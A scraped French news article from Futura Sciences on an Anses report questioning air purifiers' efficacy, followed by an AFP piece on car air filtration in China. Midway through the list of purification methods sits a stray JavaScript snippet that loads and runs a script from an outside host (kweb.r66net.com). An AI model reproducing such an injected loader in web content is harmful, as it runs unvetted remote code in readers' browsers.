{"title": "Purificateurs d'air : pourquoi il faut s'en mefier", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-11-10", "content": " Un rapport de l'Anses (Agence nationale de securite sanitaire de l'alimentation, de l'environnement et du travail) pointe le manque de preuves de l'efficacite des dispositifs pour purifier l'air des habitations et des lieux de travail. La question est d'importance car la pollution interieure est effectivement preoccupante. Ce qu'il faut retenir Les systemes d'epuration d'air peuvent etre efficaces mais pas a 100 %. Les purificateurs en sprays peuvent aussi emettre des composes indesirables. Rien ne remplace une bonne aeration. Au  Mondial du batiment , qui se tient actuellement a Villepinte (Seine-Saint-Denis) et qui regroupe trois salons, plusieurs tendances s'affirment, dont les  purificateurs  d' air . En effet, la pollution de l'air interieur est un vrai probleme de sante publique. Depuis plusieurs decennies, l'isolation thermique a fait de gros progres, au detriment de la circulation de l'air, et, durant le meme temps, nos habitations se sont peuplees de multiples emetteurs de produits chimiques, de la colle des meubles aux moquettes synthetiques en passant par les insecticides, les desodorisants et la  decoration . Pourtant, l'Anses (Agence nationale de securite sanitaire de l'alimentation, de l'environnement et du travail) est d'avis de se mefier des affirmations des fabricants. Une etude, etalee sur plusieurs annees, a passe en revue pres de 500 produits. Les plus vendus, note le  rapport de l'Anses , sont les sprays, parce que leur prix est modique. Malheureusement, le comite d'experts de l'agence ne s'est pas penche de pres sur leur cas, car, en tant que << biocides >>, ils seront soumis a une reglementation europeenne... dans quelques annees. Pourtant, le rapport remarque deux etudes qui montraient que ces sprays emettent des COV (Composes organiques volatils), en principe indesirables. Ils peuvent aussi contenir des huiles essentielles, bien vues du public en general mais qui sont  allergenes  pour certaines personnes. L'equipe du laboratoire Ircelyon (CNRS, Lyon) explique brievement le principe d'un tissu, a l'etude en 2015, ou la lumiere, diffusee par un entrelacs de fibres optiques, vient activer des reactions chimiques capables de decomposer certains polluants. C'est la methode de la photocatalyse. (c) Cyril Fresillon, Ircelyon, CNRS,  Le Monde Piegeage ou destruction des polluants d'interieur Moins bien vendus, mais beaucoup plus nombreux en modeles disponibles, les epurateurs, ou purificateurs, s'appuient sur des technologies souvent qualifiees de << nouvelles >> mais qui ne sont expliquees qu'en termes vagues. Plusieurs principes sont exploites, seuls ou combines, pour degrader chimiquement des  polluants , des petites particules et des microbes, ou bien pour les pieger :  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La  filtration . Systeme le plus simple, il impose une importante circulation d'air pour retenir les polluants. La  photocatalyse  (voir la video ci-dessus). De la lumiere, ou un rayonnement UV, active un catalyseur (souvent du dioxyde de titane), lequel engendre alors des reactions chimiques qui degradent les molecules organiques, avec production finale de vapeur d'eau et de gaz carbonique. Il n'y a pas de filtres. Les polluants sont censes etre detruits. L'ionisation avec filtration. Un dispositif electronique ionise les molecules et les atomes de l'air passant dans le systeme. Ces ions electriquement charges sont alors pieges par des surfaces, chargees elles aussi. Le plasma. Un systeme electronique produit des charges negatives (par exemple par effet couronne quand des electrons s'accumulent spontanement sur une pointe). Il ionise donc l'air alentour, engendrant des radicaux libres, censes s'attaquer aux polluants. L'ozonation. Employee plutot en milieu professionnel, cette technique consiste a produire de l' ozone  (O 3 ), une molecule extremement reactive, qui oxyde tout ce qu'elle voit en cedant un atome d'oxygene, devenant donc une molecule de dioxygene. Elle est si reactive qu'elle est quasiment un poison. Il ne faut pas en respirer beaucoup ni longtemps. En revanche, elle se degrade tres rapidement ; il suffit donc d'aerer genereusement le local. Conclusion de l'Anses : les donnees fournies par les fabricants  << ne permettent pas de demontrer l'efficacite et l'innocuite en conditions reelles d'utilisation des dispositifs >> . Par ailleurs, un systeme fonctionnant mal peut emettre des molecules nocives, comme des COV. Cela semble etre particulierement le cas des sprays ; une enquete de  Que choisir  du debut de l'annee stigmatisait aussi les barres d'encens et le papier d'Armenie. Moralite : la meilleure methode pour maintenir une bonne  qualite de l'air interieur  reste l'aeration, avec l'ouverture de fenetres generant un courant d'air au moins dix minutes par jour. Pour en savoir plus Chine : des purificateurs d'air dans les voitures face a la pollution Article AFP publie le 30 avril 2014 La pollution atmospherique est de plus en plus severe dans le monde et particulierement en Chine. Pour aider les automobilistes chinois a mieux respirer, plusieurs constructeurs proposent de purifier l'air a l'interieur des vehicules. Quand le  salon automobile  de Pekin a ouvert ses  portes  au public, la capitale etait nimbee d'un  smog  brunatre, si familier aux metropoles chinoises. Et l'explosion du trafic routier n'aide guere a la qualite de l'air, deja mise a mal par les usines et les centrales a  charbon . Bien que la filtration d'air dans l'habitacle existe depuis trois decennies, les graves problemes de  pollution en Chine , premier marche  automobile  mondial, ont encourage les constructeurs a developper et a ameliorer significativement ces equipements. Volvo, le constructeur suedois rachete par le chinois Geely, se targue d'offrir de l'air propre grace a ses equipements filtrant particules,  pollens  et residus d'ozone.  << A l'interieur d'une Volvo, on respire comme si on etait en Scandinavie, et des qu'on ouvre la portiere, on retrouve l' air de Pekin   >> , avait meme affirme Li Shufu, president de Geely. De son cote, le japonais Nissan propose depuis 2010 sur sa gamme premium Infiniti un systeme de  filtration  appele Forest Air.  << C'est crucial aux  yeux  des consommateurs, surtout en ces jours de  brouillard  polluant >> , a souligne Fan Zhuang, responsable des ventes de la marque au salon de Pekin. Il met egalement en avant un autre avantage :  << alors que les  fumeurs  inveteres sont legion en Chine, y compris au volant, Forest Air permettrait de faire disparaitre en cinq minutes volutes de fumee et odeurs de cigarette >> . Volvo a lance a l'automne une campagne publicitaire vantant des equipements purificateurs d'air. (c) Christopher Persson,  Wikimedia Commons , DP                               Les automobilistes chinois obsedes par la pollution et la qualite de l'air Le constructeur francais  PSA  Peugeot Citroen est lui aussi dans la course. En effet, son modele C4 Elysee dispose deja, en option, d'un  purificateur d'air . Selon Patrick Andre, charge de cette thematique a la direction recherche et developpement du groupe, ces vehicules pourront etre equipes en serie a partir de 2016.  << Cela concernera d'abord la gamme premium DS, puis les autres modeles selon leur positionnement et selon ce que mettra en place la concurrence >> , a-t-il indique. Le systeme de filtration intelligente mis au point par PSA ne se declenche qu'en zone polluee.  << Un ventilateur purifie l'air interieur grace a un filtre haut de gamme qui bloque 90 % des  particules les plus fines  (inferieures a 2,5  micrometres ), tandis qu'un charbon actif peut y etre adjoint pour capter la pollution gazeuse >> , a explique Patrick Andre. De leur cote, les equipementiers se montrent tout aussi soucieux de tirer leur epingle du jeu : le francais Valeo a ainsi developpe en Chine un systeme remplacant le filtre de  climatisation  classique. Le marche chinois pourrait bien faire figure de  terre  promise.  << La qualite de l'air est un enjeu general dans le pays, et les Chinois en sont de plus en plus conscients >> , a souligne Edouard de Pirey, responsable de Valeo en Chine.  << Beaucoup de gens ont deja des filtres a particules a leur domicile pour proteger leurs enfants, et les  applications  permettant de consulter la  qualite de l'air  avec son  smartphone  y connaissent un franc succes >> , a-t-il insiste. << Le  souci  de proteger la sante de sa famille est certainement un critere essentiel quand il s'agit de choisir une voiture >> , abonde Wang Jiran, un visiteur du salon de Pekin. En effet, au fil des  pics de pollution  de l'air, les consommateurs chinois se montrent de plus en plus inquiets et exigeants, et de l'avis general, l'industrie ne fait qu'anticiper cette tendance.  << Les consommateurs chinois sont obsedes par la securite. Vous pouvez doper vos ventes si vous garantissez un air plus propre et des voitures plus sures >> , releve Namrita Chow, analyste du cabinet IHS Automotive. Et meme s'ils sont developpes en priorite pour la Chine, ces systemes de filtration pourraient bien finir par gagner les marches europeens, previennent des acteurs du secteur.  << La problematique existe egalement en Europe, comme l'a rappele l'episode de  pollution  en mars en France , observe Patrick Andre.  La fabrication de  masse  en Chine permettra d'abaisser les couts de production. >> ", "theme": "planete"}